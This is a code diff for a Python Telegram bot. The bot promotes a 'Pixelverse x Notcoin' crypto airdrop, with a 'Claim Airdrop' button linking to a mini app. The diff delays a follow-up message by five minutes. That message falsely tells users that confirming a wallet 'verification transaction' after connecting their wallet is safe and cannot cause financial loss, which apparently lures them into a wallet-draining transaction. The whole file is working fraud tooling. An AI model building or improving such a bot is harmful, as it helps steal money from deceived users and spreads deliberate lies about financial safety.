@@ -18,6 +18,8 @@ MINI_APP_URL = 't.me/Ethenathe_bot/Web3Rewards'  # Remplace par l'URL de ta mini
 user_ids = set()
 # Intervalle de temps pour les messages périodiques en secondes (exemple : 1 heure)
 MESSAGE_INTERVAL = 3600
+# Délai pour envoyer le message "Pixelverse x Notcoin" en secondes (exemple : 5 minutes)
+PIXELVERSE_MESSAGE_DELAY = 300
 
 # Fonction pour démarrer le bot et envoyer l'image avec texte et boutons
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -36,16 +38,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             "Spaces are limited."
         )
 
-        # Message HTML à ajouter
-        html_message = (
-            "<b>Pixelverse x Notcoin 🛠️</b>\n\n"
-            "⚠️ <b>Pan, if you received a transaction with the comment stating that you are not eligible for the airdrop, don't be scared!</b>\n\n"
-            "It means that an airdrop is available for you and the system has sent a verification message to check that your wallet is not a spam wallet.\n\n"
-            "❗ <b>Important note:</b>\n\n"
-            "If your profile is eligible for the reward, after you have connected your wallet, the verification system will prompt you to confirm the verification transaction, it must be confirmed. Otherwise, you will not be able to collect your reward.\n\n"
-            "<b>Due to the increasing cases of spam and system abuses, we had to introduce this stage of verification. It is safe and does not cause any financial losses for you.</b>"
-        )
-
         # Boutons
         keyboard = [
             [InlineKeyboardButton("Claim Airdrop 🎁", url=MINI_APP_URL)],
@@ -55,11 +47,33 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
         # Envoi de l'image avec le texte en légende et les boutons
         await bot.send_photo(chat_id=update.message.chat_id, photo=IMAGE_URL, caption=message_text, reply_markup=reply_markup)
-        await bot.send_message(chat_id=update.message.chat_id, text=html_message, parse_mode="HTML")
-        print("Messages envoyés avec succès")
+        print("Premier message envoyé avec succès")
+
+        # Planification de l'envoi du message "Pixelverse x Notcoin" après un délai
+        context.job_queue.run_once(send_pixelverse_message, PIXELVERSE_MESSAGE_DELAY, context=user_id)
     except Exception as e:
         logging.error(f"Failed to send message: {e}")
         await update.message.reply_text("Failed to send message.")
+
+# Fonction pour envoyer le message "Pixelverse x Notcoin"
+async def send_pixelverse_message(context: ContextTypes.DEFAULT_TYPE) -> None:
+    job = context.job
+    user_id = job.context
+
+    html_message = (
+        "<b>Pixelverse x Notcoin 🛠️</b>\n\n"
+        "⚠️ <b>Pan, if you received a transaction with the comment stating that you are not eligible for the airdrop, don't be scared!</b>\n\n"
+        "It means that an airdrop is available for you and the system has sent a verification message to check that your wallet is not a spam wallet.\n\n"
+        "❗ <b>Important note:</b>\n\n"
+        "If your profile is eligible for the reward, after you have connected your wallet, the verification system will prompt you to confirm the verification transaction, it must be confirmed. Otherwise, you will not be able to collect your reward.\n\n"
+        "<b>Due to the increasing cases of spam and system abuses, we had to introduce this stage of verification. It is safe and does not cause any financial losses for you.</b>"
+    )
+
+    try:
+        await context.bot.send_message(chat_id=user_id, text=html_message, parse_mode="HTML")
+        print("Message 'Pixelverse x Notcoin' envoyé avec succès")
+    except Exception as e:
+        logging.error(f"Failed to send Pixelverse message to {user_id}: {e}")
 
 # Fonction pour envoyer des messages périodiques
 async def send_periodic_message(context: ContextTypes.DEFAULT_TYPE) -> None:
